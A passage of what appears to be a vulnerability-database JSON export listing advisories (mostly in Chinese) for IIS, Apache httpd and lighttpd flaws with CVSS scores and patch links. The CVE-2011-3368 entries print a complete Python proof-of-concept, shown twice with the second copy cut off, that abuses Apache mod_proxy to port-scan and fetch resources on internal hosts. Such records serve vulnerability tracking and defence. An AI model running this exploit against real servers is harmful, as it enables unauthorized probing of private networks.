                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:15167"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 43140\r\nCVE ID: CVE-2010-1899\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\nIIS\u4e2d\u7684\u811a\u672c\u5904\u7406\u4ee3\u7801\u5728\u5904\u7406\u91cd\u590d\u7684\u53c2\u6570\u8bf7\u6c42\u65f6\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5bf9IIS\u6240\u627f\u8f7d\u7f51\u7ad9\u7684ASP\u9875\u9762\u53d1\u9001\u7279\u5236URI\u8bf7\u6c42\u6765\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u670d\u52a1\u5d29\u6e83\u3002\n\nMicrosoft IIS 7.5\r\nMicrosoft IIS 7.0\r\nMicrosoft IIS 6.0\r\nMicrosoft IIS 5.1\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n* \u5728IIS\u670d\u52a1\u5668\u4e0a\u4e34\u65f6\u7981\u7528ASP\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS10-065\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nMS10-065\uff1aVulnerabilities in Microsoft Internet Information Services (IIS) Could Allow Remote Code Execution (2267960)\r\n\u94fe\u63a5\uff1ahttp://www.microsoft.com/technet/security/bulletin/MS10-065.mspx?pf=true",
            "modified": "2010-09-17T00:00:00",
            "published": "2010-09-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20121",
            "id": "SSV:20121",
            "type": "seebug",
            "title": "Microsoft IIS\u91cd\u590d\u53c2\u6570\u8bf7\u6c42\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff08MS10-065\uff09",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20121"
        }
    ],
    "CVE-2013-2249": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 61379\r\nCVE(CAN) ID: CVE-2013-2249\r\n\r\nApache HTTP Server\u662f\u5f00\u6e90HTTP\u670d\u52a1\u5668\u3002\r\n\r\nApache HTTP Server 2.4.6\u4e4b\u524d\u7248\u672c\u7684mod_session_dbd\u6a21\u5757\u5728\u4fdd\u5b58\u4f1a\u8bdd\u8fc7\u7a0b\u4e2d\u5904\u7406\u201c\u810f\u65d7\u6807\u201d\u65f6\u51fa\u9519\uff0c\u5b58\u5728\u8fdc\u7a0b\u5b89\u5168\u6f0f\u6d1e\uff0c\u5f71\u54cd\u76ee\u524d\u672a\u77e5\u3002\r\n0\r\nApache 2.4.2\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\nApache Group\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08Announcement2.4\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nAnnouncement2.4\uff1aApache HTTP Server 2.4.6 Released\r\n\u94fe\u63a5\uff1ahttp://www.apache.org/dist/httpd/Announcement2.4.html\r\n\r\n\u8865\u4e01\u4e0b\u8f7d\uff1ahttp://httpd.apache.org/download.cgi",
            "modified": "2013-07-26T00:00:00",
            "published": "2013-07-26T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60913",
            "id": "SSV:60913",
            "type": "seebug",
            "title": "Apache HTTP Server mod_session_dbd \u8fdc\u7a0b\u5b89\u5168\u6f0f\u6d1e(CVE-2013-2249)",
            "sourceData": "",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60913"
        }
    ],
    "CVE-2012-3499": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 58165\r\nCVE(CAN) ID: CVE-2012-3499\r\n\r\nApache HTTP Server\u662f\u5f00\u6e90HTTP\u670d\u52a1\u5668\u3002\r\n\r\nApache HTTP Server 2.4.4\u53ca\u4e4b\u524d\u7248\u672c\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u591a\u4e2aXSS\u6f0f\u6d1e\uff0c\u901a\u8fc7\u6a21\u5757(1) mod_imagemap, (2) mod_info, (3) mod_ldap, (4) mod_proxy_ftp, (5) mod_status\u5185\u7684\u4e3b\u673a\u540d\u548cURI\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u6ce8\u5165\u4efb\u610fjs\u811a\u672c\u548cHTML\u3002\n0\nApache Group HTTP Server 2.4.x\r\nApache Group HTTP Server 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://httpd.apache.org/",
            "modified": "2013-02-28T00:00:00",
            "published": "2013-02-28T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60653",
            "id": "SSV:60653",
            "title": "Apache  HTTP Server\u591a\u4e2a\u6a21\u5757\u4e3b\u673a\u540d\u548cURI\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60653"
        }
    ],
    "CVE-2012-4558": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 58165\r\nCVE(CAN) ID: CVE-2012-4558\r\n\r\nApache HTTP Server\u662f\u5f00\u6e90HTTP\u670d\u52a1\u5668\u3002\r\n\r\nApache HTTP Server\u88ab\u62a5\u544a\u5b58\u5728\u591a\u4e2a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u80fd\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u8fdb\u884c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002\r\n\r\n1\uff09mod_info, mod_ldap, mod_status, mod_imagemap, \u4ee5\u53camod_proxy_ftp\u6a21\u5757\u4e2d\u67d0\u4e9b\u4e0ehostnames\u548cURI\u76f8\u5173\u7684\u8f93\u5165\u6ca1\u6709\u7ecf\u8fc7\u6b63\u786e\u7684\u68c0\u67e5\u5373\u8fd4\u56de\u7ed9\u7528\u6237\u3002\r\n2\uff09\u4f20\u9012\u7ed9mod_proxy_balancer\u6a21\u5757\u7ba1\u7406\u63a5\u53e3\u7684\u67d0\u4e9b\u4e0d\u786e\u5b9a\u8f93\u5165\u6ca1\u6709\u7ecf\u8fc7\u6b63\u786e\u68c0\u67e5\u5373\u8fd4\u56de\u7ed9\u7528\u6237\u3002\r\n\r\n\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u80fd\u88ab\u6076\u610f\u653b\u51fb\u8005\u7528\u6765\u5728\u53d7\u5f71\u54cd\u7684\u7f51\u7ad9\u4e0a\u4e0b\u6587\u4e2d\u63d2\u5165\u4ee3\u7801\uff0c\u4ece\u800c\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4f1a\u8bdd\u4e2d\u6267\u884c\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u3002\r\n\r\n\u6f0f\u6d1e\u5f71\u54cd 2.2.24\u4e4b\u524d\u7684\u7248\u672c\u4ee5\u53ca2.4.4\u3002\r\n0\r\nApache Group HTTP Server 2.4.x\r\nApache Group HTTP Server 2.2.x\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://httpd.apache.org/",
            "modified": "2013-02-28T00:00:00",
            "published": "2013-02-28T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60657",
            "id": "SSV:60657",
            "title": "Apache  HTTP Server balancer_handler\u51fd\u6570\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e(CVE-2012-4558)",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60657"
        }
    ],
    "CVE-2013-1896": [
        {
            "bulletinFamily": "exploit",
            "description": "CVE ID:CVE-2013-1896\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684WEB\u670d\u52a1\u5668\r\n\r\nApache HTTP Server 2.2.25\u4e4b\u524d\u7248\u672c\u4e2d\u7684mod_dav.c\u6ca1\u6709\u6b63\u786e\u5224\u65adURI\u662f\u5426\u542f\u7528DAV\uff0c\u5141\u8bb8\u8fdc\u7a0b\u653b\u51fb\u8005\u63d0\u4ea4URI\u7531mod_dav_svn\u6a21\u5757\u5904\u7406\uff0c\u4f46XML\u6570\u636e\u4e2d\u7684\u67d0\u4e9bhref\u5c5e\u6027\u5f15\u7528\u975eDAV URI\u7684MERGET\u8bf7\u6c42\uff0c\u53ef\u4f7f\u670d\u52a1\u7a0b\u5e8f\u89e6\u53d1\u6bb5\u9519\u8bef\u800c\u5d29\u6e83\r\n0\r\nApache HTTP Server &lt; 2.2.25\r\nhttp://www.apache.org/dist/httpd/Announcement2.2.html\r\nhttp://svn.apache.org/viewvc/httpd/httpd/trunk/modules/dav/main/mod_dav.c?view=log\r\nhttp://svn.apache.org/viewvc/httpd/httpd/trunk/modules/dav/main/mod_dav.c?r1=1482522&amp;r2=1485668&amp;diff_format=h",
            "modified": "2013-07-17T00:00:00",
            "published": "2013-07-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60905",
            "id": "SSV:60905",
            "title": "Apache HTTP Server mod_dav.c \u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e(CVE-2013-1896)",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60905"
        }
    ],
    "CVE-2013-1862": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 59826\r\nCVE(CAN) ID: CVE-2013-1862\r\n\r\nApache HTTP Server\u662f\u5f00\u6e90HTTP\u670d\u52a1\u5668\u3002\r\n\r\nApache HTTP Server mod_rewrite\u5411\u65e5\u5fd7\u6587\u4ef6\u5199\u5165\u6570\u636e\u65f6\uff0c\u6ca1\u6709\u8fc7\u6ee4\u4e0d\u80fd\u6253\u5370\u7684\u5b57\u7b26\u3002\u5982\u679c mod_rewrite \u4f7f\u7528\u4e86\u6307\u4ee4RewriteLog\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u5411\u65e5\u5fd7\u6587\u4ef6\u5199\u5165\u7ec8\u7aef\u8f6c\u4e49\u5e8f\u5217\u3002\u5982\u679cHTTP\u8bf7\u6c42\u5305\u542b\u7ec8\u7aef\u6a21\u62df\u5668\u7684\u8f6c\u4e49\u5e8f\u5217\uff0c\u6b64\u6f0f\u6d1e\u4e5f\u53ef\u9020\u6210\u4efb\u610f\u547d\u4ee4\u6267\u884c\u3002\n0\nApache Group HTTP Server 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://httpd.apache.org/\r\nhttp://people.apache.org/~jorton/mod_rewrite-CVE-2013-1862.patch",
            "modified": "2013-05-17T00:00:00",
            "published": "2013-05-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60788",
            "id": "SSV:60788",
            "title": "Apache HTTP Server\u65e5\u5fd7\u5185\u7ec8\u7aef\u8f6c\u4e49\u5e8f\u5217\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 5.1,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60788"
        }
    ],
    "CVE-2012-2687": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 55131\r\nCVE ID: CVE-2012-2687,CVE-2012-3502\r\n\r\nApache HTTP Server\uff08\u7b80\u79f0Apache\uff09\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u591a\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728HTML\u6ce8\u5165\u6f0f\u6d1e\u548c\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u5728\u53d7\u5f71\u54cd\u7ad9\u70b9\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u4efb\u610f\u811a\u672c\u4ee3\u7801\uff0c\u7a83\u53d6cookie\u8eab\u4efd\u9a8c\u8bc1\u51ed\u8bc1\u6216\u63a7\u5236\u7ad9\u70b9\u5916\u89c2\u3002\n0\nApache 2.4.2\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.apache.org",
            "modified": "2012-08-23T00:00:00",
            "published": "2012-08-23T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60345",
            "id": "SSV:60345",
            "type": "seebug",
            "title": "Apache 2.4.2 HTTP Server HTML\u6ce8\u5165\u548c\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60345"
        }
    ],
    "CVE-2014-2324": [
        {
            "bulletinFamily": "exploit",
            "description": "CVE ID\uff1aCVE-2014-2324\r\n\r\nLighttpd\u662f\u5fb7\u56fd\u8f6f\u4ef6\u5f00\u53d1\u8005Jan Kneschke\u6240\u7814\u53d1\u7684\u4e00\u6b3e\u5f00\u6e90\u7684Web\u670d\u52a1\u5668\uff0c\u5b83\u7684\u4e3b\u8981\u7279\u70b9\u662f\u4ec5\u9700\u5c11\u91cf\u7684\u5185\u5b58\u53caCPU\u8d44\u6e90\u5373\u53ef\u8fbe\u5230\u540c\u7c7b\u7f51\u9875\u670d\u52a1\u5668\u7684\u6027\u80fd\u3002 \r\n\r\nlighttpd mod_evhost\u548cmod_simple_vhost\u865a\u62df\u4e3b\u673a\u6a21\u5757\u4e2d\u5b58\u5728\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684\u4e3b\u673a\u540d\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\n0\nlighttpd\n\u76ee\u524d\u5382\u5546\u6682\u65e0\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\nhttp://www.lighttpd.net/2014/3/12/1.4.35/",
            "modified": "2014-03-19T00:00:00",
            "published": "2014-03-19T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61850",
            "id": "SSV:61850",
            "title": "lighttpd\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61850"
        }
    ],
    "CVE-2014-2323": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 66153\r\nCVE(CAN) ID: CVE-2014-2323\r\n\r\nLighttpd\u662f\u4e00\u6b3e\u8f7b\u578b\u7684\u5f00\u653e\u6e90\u7801Web Server\u8f6f\u4ef6\u5305\u3002\r\n\r\n\u7531\u4e8e\u7a0b\u5e8f\u5728\u8fdb\u884cSQL\u67e5\u8be2\u524d\u672a\u80fd\u5145\u5206\u8fc7\u6ee4\u7528\u6237\u63d0\u4f9b\u7684\u8f93\u5165\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u5371\u53ca\u5e94\u7528\u7a0b\u5e8f\uff0c\u8bbf\u95ee\u6216\u4fee\u6539\u6570\u636e\uff0c\u6216\u5229\u7528\u5e95\u5c42\u6570\u636e\u5e93\u4e2d\u6f5c\u5728\u7684\u6f0f\u6d1e\u3002\n0\nlighttpd &lt;1.4.35\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\nhttp://www.lighttpd.net",
            "modified": "2014-03-28T00:00:00",
            "published": "2014-03-28T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61980",
            "id": "SSV:61980",
            "type": "seebug",
            "title": "lighttpd 'mod_mysql_vhost.c' SQL\u6ce8\u5165\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61980"
        }
    ],
    "CVE-2011-3368": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2011-10-12T00:00:00",
            "published": "2011-10-12T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20993",
            "id": "SSV:20993",
            "title": "Apache mod_proxy Reverse Proxy Exposure Vulnerability PoC",
            "type": "seebug",
            "sourceData": "\n                                                #!/usr/bin/env python\r\n \r\nimport socket\r\nimport string\r\nimport getopt, sys\r\n \r\n \r\nknown_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]\r\n \r\ndef send_request(url, apache_target, apache_port, internal_target, internal_port, resource):\r\n \r\n    get = &quot;GET &quot; + url + &quot;@&quot; + internal_target + &quot;:&quot; + internal_port +  &quot;/&quot; + resource + &quot; HTTP/1.1\\r\\n&quot;\r\n    get = get + &quot;Host: &quot; + apache_target + &quot;\\r\\n\\r\\n&quot;\r\n     \r\n    remoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    remoteserver.settimeout(3)\r\n \r\n    try:\r\n        remoteserver.connect((apache_target, int(apache_port)))\r\n        remoteserver.send(get)\r\n        return remoteserver.recv(4096)\r\n    except:\r\n        return &quot;&quot;\r\n \r\ndef get_banner(result):\r\n    return result[string.find(result, &quot;\\r\\n\\r\\n&quot;)+4:]\r\n \r\n \r\ndef scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):\r\n \r\n    print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)\r\n    for port in tested_ports:\r\n        port = str(port)\r\n        result = send_request(url, apache_target, apache_port, internal_target, port, resource)\r\n        if string.find(result,&quot;HTTP/1.1 200&quot;)!=-1 or \\\r\n        string.find(result,&quot;HTTP/1.1 30&quot;)!=-1 or \\\r\n        string.find(result,&quot;HTTP/1.1 502&quot;)!=-1:\r\n            print &quot;- Open port: &quot; + port + &quot;/TCP&quot;\r\n            print get_banner(result)\r\n        elif len(result)==0:\r\n            print &quot;- Filtered port: &quot; + port + &quot;/TCP&quot;\r\n        else:\r\n            print &quot;- Closed port: &quot; + port + &quot;/TCP&quot;\r\n             \r\n \r\ndef usage():\r\n    print\r\n    print &quot;CVE-2011-3368 proof of concept by Rodrigo Marcos&quot;\r\n    print &quot;http://www.secforce.co.uk&quot;\r\n    print\r\n    print &quot;usage():&quot;\r\n    print &quot;python apache_scan.py [options]&quot;\r\n    print\r\n    print &quot; [options]&quot;\r\n    print &quot;     -r: Remote Apache host&quot;\r\n    print &quot;     -p: Remote Apache port (default is 80)&quot;\r\n    print &quot;     -u: URL on the remote web server (default is /)&quot;\r\n    print &quot;     -d: Host in the DMZ (default is 127.0.0.1)&quot;\r\n    print &quot;     -e: Port in the DMZ (enables 'single port scan')&quot;\r\n    print &quot;     -g: GET request to the host in the DMZ (default is /)&quot;\r\n    print &quot;     -h: Help page&quot;\r\n    print\r\n    print &quot;examples:&quot;\r\n    print &quot; - Port scan of the remote host&quot;\r\n    print &quot;     python apache_scan.py -r www.example.com -u /images/test.gif&quot;\r\n    print &quot; - Port scan of a host in the DMZ&quot;\r\n    print &quot;     python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local&quot;\r\n    print &quot; - Retrieve a resource from a host in the DMZ&quot;\r\n    print &quot;     python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html&quot;\r\n    print\r\n \r\ndef print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):\r\n    print\r\n    print &quot;CVE-2011-3368 proof of concept by Rodrigo Marcos&quot;\r\n    print &quot;http://www.secforce.co.uk&quot;\r\n    print\r\n    print &quot; [+] Target: &quot; + apache_target\r\n    print &quot; [+] Target port: &quot; + apache_port\r\n    print &quot; [+] Internal host: &quot; + internal_target\r\n    print &quot; [+] Tested ports: &quot; + str(tested_ports)\r\n    print &quot; [+] Internal resource: &quot; + resource\r\n    print\r\n \r\n \r\ndef main():\r\n \r\n    global apache_target\r\n    global apache_port\r\n    global url\r\n    global internal_target\r\n    global internal_port\r\n    global resource\r\n \r\n    try:\r\n        opts, args = getopt.getopt(sys.argv[1:], &quot;u:r:p:d:e:g:h&quot;, [&quot;help&quot;])\r\n    except getopt.GetoptError:\r\n        usage()\r\n        sys.exit(2)\r\n \r\n    try:\r\n        for o, a in opts:\r\n            if o in (&quot;-h&quot;, &quot;--help&quot;):\r\n                usage()\r\n                sys.exit(2)\r\n            if o == &quot;-u&quot;:\r\n                url=a\r\n            if o == &quot;-r&quot;:\r\n                apache_target=a\r\n            if o == &quot;-p&quot;:\r\n                apache_port=a\r\n            if o == &quot;-d&quot;:\r\n                internal_target = a\r\n            if o == &quot;-e&quot;:\r\n                internal_port=a\r\n            if o == &quot;-g&quot;:\r\n                resource=a             \r\n         \r\n    except getopt.GetoptError:\r\n        usage()\r\n        sys.exit(2)\r\n         \r\n    if apache_target == &quot;&quot;:\r\n        usage()\r\n        sys.exit(2)\r\n \r\n \r\nurl = &quot;/&quot;\r\napache_target = &quot;&quot;\r\napache_port = &quot;80&quot;\r\ninternal_target = &quot;127.0.0.1&quot;\r\ninternal_port = &quot;&quot;\r\nresource = &quot;/&quot;\r\n \r\nmain()\r\n \r\nif internal_port!=&quot;&quot;:\r\n    tested_ports = [internal_port]\r\nelse:\r\n    tested_ports = known_ports\r\n \r\nscan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)\r\n\n                              ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20993"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache mod_proxy Reverse Proxy Exposure Vulnerability PoC. CVE-2011-3368. Remote exploits for multiple platform",
            "modified": "2011-10-11T00:00:00",
            "published": "2011-10-11T00:00:00",
            "id": "EDB-ID:17969",
            "href": "https://www.exploit-db.com/exploits/17969/",
            "type": "exploitdb",
            "title": "Apache mod_proxy Reverse Proxy Exposure Vulnerability PoC",
            "sourceData": "#!/usr/bin/env python\r\n\r\nimport socket\r\nimport string\r\nimport getopt, sys\r\n\r\n\r\nknown_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]\r\n\r\ndef send_request(url, apache_target, apache_port, internal_target, internal_port, resource):\r\n\r\n\tget = \"GET \" + url + \"@\" + internal_target + \":\" + internal_port +  \"/\" + resource + \" HTTP/1.1\\r\\n\"\r\n\tget = get + \"Host: \" + apache_target + \"\\r\\n\\r\\n\"\r\n\t\r\n\tremoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n\tremoteserver.settimeout(3)\r\n\r\n\ttry:\r\n\t\tremoteserver.connect((apache_target, int(apache_port)))\r\n\t\tremoteserver.send(get)\r\n\t\treturn remoteserver.recv(4096)\r\n\texcept:\r\n\t\treturn \"\"\r\n\r\ndef get_banner(result):\r\n\treturn result[string.find(result, \"\\r\\n\\r\\n\")+4:]\r\n\r\n\r\ndef scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):\r\n\r\n\tprint_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)\r\n\tfor port in tested_ports:\r\n\t\tport = str(port)\r\n\t\tresult = send_request(url, apache_target, apache_port, internal_target, port, resource)\r\n\t\tif string.find(result,\"HTTP/1.1 200\")!=-1 or \\\r\n\t\tstring.find(result,\"HTTP/1.1 30\")!=-1 or \\\r\n\t\tstring.find(result,\"HTTP/1.1 502\")!=-1:\r\n\t\t\tprint \"- Open port: \" + port + \"/TCP\"\r\n\t\t\tprint get_banner(result)\r\n\t\telif len(result)==0:\r\n\t \t\tprint \"- Filtered port: \" + port + \"/TCP\"\r\n\t\telse:\r\n\t \t\tprint \"- Closed port: \" + port + \"/TCP\"\r\n\t\t\t\r\n\r\ndef usage():\r\n\tprint\r\n\tprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"\r\n\tprint \"http://www.secforce.co.uk\"\r\n\tprint\r\n\tprint \"usage():\"\r\n\tprint \"python apache_scan.py [options]\"\r\n\tprint\r\n\tprint \" [options]\"\r\n\tprint \"\t\t-r: Remote Apache host\"\r\n\tprint \"\t\t-p: Remote Apache port (default is 80)\"\r\n\tprint \"\t\t-u: URL on the remote web server (default is /)\"\r\n\tprint \"\t\t-d: Host in the DMZ (default is 127.0.0.1)\"\r\n\tprint \"\t\t-e: Port in the DMZ (enables 'single port scan')\"\r\n\tprint \"\t\t-g: GET request to the host in the DMZ (default is /)\"\r\n\tprint \"\t\t-h: Help page\"\r\n\tprint\r\n\tprint \"examples:\"\r\n\tprint \" - Port scan of the remote host\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif\"\r\n\tprint \" - Port scan of a host in the DMZ\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local\"\r\n\tprint \" - Retrieve a resource from a host in the DMZ\"\r\n\tprint \"\t\tpython apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html\"\r\n\tprint\r\n\r\ndef print_banner(url, apache_target, 